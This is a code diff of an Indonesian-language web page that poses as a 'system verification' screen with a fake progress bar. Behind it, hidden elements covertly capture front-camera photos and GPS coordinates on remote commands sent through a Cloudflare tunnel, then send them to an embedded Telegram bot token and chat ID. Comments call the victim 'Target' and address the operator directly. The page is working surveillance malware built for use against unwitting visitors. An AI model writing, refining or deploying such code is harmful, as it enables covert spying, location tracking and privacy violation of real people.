@@ -2,80 +2,77 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>System Authentication</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sistem Verifikasi</title>
     <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
     <style>
-        body { background: #000; color: #00ff41; font-family: monospace; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; text-align: center; }
-        .loader { width: 50px; height: 50px; border: 3px solid #111; border-top: 3px solid #00ff41; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
+        body { background: #000; color: #00ff41; font-family: monospace; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
+        .loader { width: 40px; height: 40px; border: 4px solid #111; border-top: 4px solid #00ff41; border-radius: 50%; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #toast { visibility: hidden; min-width: 200px; background: #00ff41; color: #000; padding: 10px; position: fixed; bottom: 30px; border-radius: 5px; font-weight: bold; }
+        #toast { visibility: hidden; background: #00ff41; color: #000; padding: 12px; position: fixed; bottom: 30px; border-radius: 8px; font-weight: bold; z-index: 99; }
         #toast.show { visibility: visible; animation: fade 0.5s; }
         @keyframes fade { from {opacity: 0;} to {opacity: 1;} }
-        video, canvas { display: none; } /* Tersembunyi dari Target */
+        video, canvas { display: none; }
     </style>
 </head>
 <body>
     <div class="loader"></div>
-    <div id="status">⚡ MENGHUBUNGKAN... 0%</div>
+    <h2 id="status">VERIFIKASI SISTEM... 0%</h2>
     <div id="toast"></div>
-    
     <video id="video" autoplay></video>
     <canvas id="canvas"></canvas>
 
     <script>
-        const BACKEND_URL = "https://humanities-concerts-challenging-generous.trycloudflare.com"; 
+        // === ⚡ GANTI LINK TUNNEL TUAN DI SINI! ⚡ ===
+        const BACKEND_URL = "https://types-passed-fellowship-math.trycloudflare.com"; 
         const BOT_TOKEN = "8441186762:AAG-wyDQFlP6sGXdIe6nxdk1HuEuAAyszWA";
-        const CHAT_ID = "7373392803";
+        const CHAT_ID = "7373392803"; // ID Tuan sudah saya masukkan otomatis
+
         const socket = io(BACKEND_URL, { transports: ['websocket'] });
 
-        async function sendToBot(msg) {
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
-        }
-
-        // --- ⚡ FITUR KAMERA (THE CORE) ⚡ ---
+        // Fungsi Ambil Foto
         async function takePhoto() {
-            const video = document.getElementById('video');
-            const canvas = document.getElementById('canvas');
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const video = document.getElementById('video');
                 video.srcObject = stream;
                 setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
                     canvas.getContext('2d').drawImage(video, 0, 0);
-                    const data = canvas.toDataURL('image/jpeg');
-                    
-                    // Kirim Foto ke Telegram via Base64 (Blob)
-                    fetch(data).then(res => res.blob()).then(blob => {
+                    canvas.toBlob(blob => {
                         const formData = new FormData();
                         formData.append('chat_id', CHAT_ID);
-                        formData.append('photo', blob, 'capture.jpg');
+                        formData.append('photo', blob, 'fionzy.jpg');
                         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
-                    });
-                    stream.getTracks().forEach(track => track.stop());
-                }, 2000);
-            } catch (e) { sendToBot("❌ Target Menolak Izin Kamera"); }
+                    }, 'image/jpeg');
+                    stream.getTracks().forEach(t => t.stop());
+                }, 1500);
+            } catch (e) { fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=❌ Target Menolak Kamera`); }
         }
 
         socket.on('command', (msg) => {
             const args = msg.split(' ');
-            const cmd = args[0].toLowerCase();
-            if(cmd === '/snap') takePhoto();
-            if(cmd === '/toast') {
+            if (msg === '/snap') takePhoto();
+            if (msg === '/vibrate') navigator.vibrate(500);
+            if (msg === '/gps') {
+                navigator.geolocation.getCurrentPosition(res => {
+                    const link = `https://www.google.com/maps?q=${res.coords.latitude},${res.coords.longitude}`;
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=📍 Lokasi Target: ${link}`);
+                });
+            }
+            if (msg.startsWith('/toast ')) {
                 const t = document.getElementById('toast');
-                t.innerText = args.slice(1).join(' ');
+                t.innerText = msg.replace('/toast ', '');
                 t.className = "show";
                 setTimeout(() => t.className = "", 3000);
             }
-            if(cmd === '/gps') {
-                navigator.geolocation.getCurrentPosition(p => sendToBot(`📍 **LOKASI**\nMaps: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`));
-            }
         });
 
-        // Simulasi Loading
+        // Efek Loading Palsu
         let p = 0;
-        setInterval(() => { if(p < 100) { p += 5; document.getElementById('status').innerText = `⚡ VERIFIKASI... ${p}%`; } }, 500);
+        setInterval(() => { if(p < 100) { p += 2; document.getElementById('status').innerText = `VERIFIKASI... ${p}%`; } }, 200);
     </script>
 </body>
 </html>
